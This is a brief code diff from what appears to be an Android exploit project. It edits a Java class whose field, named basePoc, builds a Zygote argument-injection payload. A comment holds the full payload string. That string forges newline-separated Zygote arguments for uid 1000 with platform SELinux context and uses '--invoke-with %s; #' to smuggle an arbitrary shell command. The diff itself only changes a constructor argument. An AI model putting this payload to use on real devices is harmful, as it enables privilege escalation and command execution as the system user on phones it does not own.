@@ -16,7 +16,7 @@ public class Util {
 	final static ZygoteArgumentBuilder basePoc;//"\n\n\n\n\n11\n--setuid=1000\n--setgid=9997\n--setgroups=3003\n--runtime-args\n--mount-external-full\n--mount-external-legacy\n--seinfo=platform:privapp:targetSdkVersion=30:complete\n--runtime-flags=43267\n--nice-name=zYg0te2\n--invoke-with\n%s; #,,,,X";
 
 	static {
-		basePoc = new ZygoteArgumentBuilder(30)
+		basePoc = new ZygoteArgumentBuilder()
 			.setUid(1000)
 			.setGid(9997)
 			.setGroups("3003")
